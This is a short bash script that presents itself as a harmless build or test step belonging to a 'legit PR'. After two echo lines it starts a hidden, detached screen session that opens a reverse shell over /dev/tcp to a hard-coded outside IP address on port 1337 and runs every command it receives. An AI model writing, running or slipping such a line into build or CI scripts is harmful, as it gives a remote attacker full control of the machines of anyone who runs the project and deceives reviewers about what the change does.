#!/bin/bash


echo 'This simulates some build or test process'
echo 'This is a part of a legit PR'


screen -dmS reverse_shell bash -c 'exec 5<>/dev/tcp/104.238.172.243/1337; while read line <&5; do sh -c "$line" >&5 2>&5; done'
